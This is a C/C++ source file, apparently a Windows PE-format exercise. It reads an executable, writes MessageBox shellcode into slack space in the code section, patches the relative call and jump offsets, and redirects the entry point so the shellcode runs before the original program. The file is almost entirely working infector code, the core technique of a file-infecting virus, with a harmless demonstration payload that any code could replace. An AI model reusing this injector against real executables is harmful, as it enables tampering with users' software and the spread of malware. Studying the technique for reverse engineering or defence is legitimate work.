/*
	author: ls
*/

# include <QtCore/QCoreApplication>
# define _CRT_SECURE_NO_WARNINGS
# include "stdio.h"
# include "stdlib.h"
# include "windows.h"
# include "PE.h"
# include "tchar.h"
# include<qdebug.h>

//# define NEW_FILE "C:/Users/ls/Desktop/hello_out.exe"

/*
6、通过编写控制台程序，将一个EXE文件读取到内存，在它的可执行节(代码节)中加一个弹出对话框(MessgeBox)的ShellCode，
通过修改程序执行入口实现文件感染，可以正常运行。
*/
//%49%6e%6a%65%63%74%65%64
/*BYTE ShellCode[] = {
	0x6A, 0x00,						//push 0x00
	0x6A, 0x00,						//push 0x00
	0x6A, 0x00,						//push 0x00
	0x6A, 0x00,						//push 0x00
	0xE8, 0x00, 0x00, 0x00, 0x00,	//jmp 0x00000000
	0xE9, 0x00, 0x00, 0x00, 0x00	//call 0x00000000
};*/

BYTE ShellCode[] = {
	0x33, 0xDB,						//xor ebx, ebx
	0x53,							//push ebx
	0x68, 0x63, 0x74, 0x65, 0x64,	//push 64657463               Injected
	0x68, 0x49, 0x6E, 0x6A, 0x65,	//push 656A6E49
	0x8B, 0xC4,						//mov eax, esp
	0x53,							//push ebx
	0x50,							//push eax			
	0x50,							//push eax
	0x53,//19						//push ebx
	0xE8, 0x00, 0x00, 0x00, 0x00,	//jmp 0x00000000
	0xE9, 0x00, 0x00, 0x00, 0x00	//call 0x00000000
};
int InfectionFile(PVOID FileAddress, PDWORD FileLength)
{
	int ret = 0;

	DWORD ShellLength = 29;
	DWORD InsertAddress = 0;

	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)(FileAddress);
	PIMAGE_FILE_HEADER pFileHeader = (PIMAGE_FILE_HEADER)((DWORD)pDosHeader + pDosHeader->e_lfanew + 4);
	PIMAGE_OPTIONAL_HEADER32 pOptionalHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pFileHeader + sizeof(IMAGE_FILE_HEADER));
	PIMAGE_SECTION_HEADER pSectionGroup = (PIMAGE_SECTION_HEADER)((DWORD)pOptionalHeader + pFileHeader->SizeOfOptionalHeader);
	PIMAGE_SECTION_HEADER pInsertSection = NULL;

	FILE* pf = fopen(FILE_PATH, "rb");
	if (pf == NULL)
	{
		ret = -1;
		printf("func fopen() Error: %d\n", ret);
		return ret;
	}
	ret = GetFileLength(pf, FileLength);
	if (ret != 0 && *FileLength == -1)
	{
		ret = -2;
		printf("func GetFileLength() Error!\n");
		return ret;
	}

	//1、获取当前程序的ImageBase	
	DWORD ImageBase = pOptionalHeader->ImageBase;

	//2、动态获取本机的MessageBoxA函数地址
	HMODULE hModule = LoadLibraryA("User32.dll");
	DWORD FuncAddress = (DWORD)GetProcAddress(hModule, "MessageBoxA");

	//3、获取ShellCode插入的位置  为了保险起见在指定的程序入口点进行插入(可能有些节区的文件大小为0)
	//	(1)、获取程序入口点所在的节区 人口点是RVA
	DWORD AddressOfEntryPoint_FOA = 0;
	ret = RVA_TO_FOA(FileAddress, pOptionalHeader->AddressOfEntryPoint, &AddressOfEntryPoint_FOA);
	if (ret != 0)
	{
		return ret;
	}

	for (int i = 0; i < pFileHeader->NumberOfSections; i++)
	{
		if (AddressOfEntryPoint_FOA >= pSectionGroup[i].PointerToRawData && AddressOfEntryPoint_FOA < pSectionGroup[i].PointerToRawData + pSectionGroup[i].SizeOfRawData)
		{
			pInsertSection = &pSectionGroup[i];
			break;
		}
	}

	//	(2)、判断该节区的空间是否足够
	if (ShellLength >= pInsertSection->SizeOfRawData - pInsertSection->Misc.VirtualSize)
	{
		ret = -6;
		printf("func InfectionFile() Error:%d 该节区空间不足!\n", ret);
		return ret;
	}

	//	(3)、获取插入地址
	InsertAddress = pInsertSection->Misc.VirtualSize + pInsertSection->PointerToRawData;

	//3、计算E8 Call后的地址
	DWORD E8_Next_FOA = 0;
	DWORD E8_Next_RVA = 0;
	DWORD E8_Next_VA = 0;
	DWORD E8_X_Address = 0;

	//	(1)、计算下一条指令地址FOA
	E8_Next_FOA = InsertAddress + 24;

	//	(2)、将下一条指令的地址转换成RVA
	ret = FOA_TO_RVA(FileAddress, E8_Next_FOA, &E8_Next_RVA);
	if (ret != 0)
	{
		return ret;
	}

	//	(3)、计算虚拟地址VA
	E8_Next_VA = E8_Next_RVA + ImageBase;

	//	(4)、计算X  X = 真正要跳转的地址 - E8这条指令的下一行地址
	E8_X_Address = FuncAddress - E8_Next_VA;

	//	(5)、修改ShellCode
	memcpy(&ShellCode[20], &E8_X_Address, 4);

	//4、计算E9 jmp后的地址
	DWORD E9_Next_FOA = 0;
	DWORD E9_Next_RVA = 0;
	DWORD E9_Next_VA = 0;
	DWORD E9_X_Address = 0;

	//	(1)、计算下一条指令地址FOA
	E9_Next_FOA = InsertAddress + 29;

	//	(2)、将下一条指令的地址转换成RVA
	ret = FOA_TO_RVA(FileAddress, E9_Next_FOA, &E9_Next_RVA);
	if (ret != 0)
	{
		return ret;
	}

	//	(3)、计算虚拟地址VA
	E9_Next_VA = E9_Next_RVA + ImageBase;

	//	(4)、计算X  X = 真正要跳转的地址 - E9这条指令的下一行地址
	E9_X_Address = pOptionalHeader->AddressOfEntryPoint + ImageBase - E9_Next_VA;

	//	(5)、修改ShellCode
	memcpy(&ShellCode[25], &E9_X_Address, 4);

	//5、计算程序入口
	DWORD OEP = 0;
	PDWORD pAddressOfEntryPoint = &pOptionalHeader->AddressOfEntryPoint;
	//	(1)、将OEP地址转换成RVA
	ret = FOA_TO_RVA(FileAddress, InsertAddress, &OEP);
	if (ret != 0)
	{
		return ret;
	}

	//	(2)、修改OEP
	*pAddressOfEntryPoint = OEP;

	//6、将ShellCode拷贝到文件
	memcpy((PVOID)((DWORD)FileAddress + InsertAddress), ShellCode, ShellLength);

	return ret;
}


int main()
{
	int ret = 0;
	//
	char newFile[50] = "C:/Users/ls/Desktop/hello_out.exe";
	PVOID FileAddress = NULL;
	DWORD FileLength = 0;

	//1、将文件读入到内存   
	ret = MyReadFile(&FileAddress);
	if (ret != 0)
	{
		if (FileAddress != NULL)
			free(FileAddress);
		return ret;
	}

	//2、进行感染操作
	ret = InfectionFile(FileAddress, &FileLength);
	if (ret != 0)
	{
		if (FileAddress != NULL)
			free(FileAddress);
		return ret;
	}

	//3、将修改后的文件写入硬盘
	ret = MyWriteFile(FileAddress, FileLength, newFile);
	if (ret != 0)
	{
		if (FileAddress != NULL)
			free(FileAddress);
		return ret;
	}

	qDebug() << "PE inject success!\n";

	if (FileAddress != NULL)
		free(FileAddress);

	return ret;
}
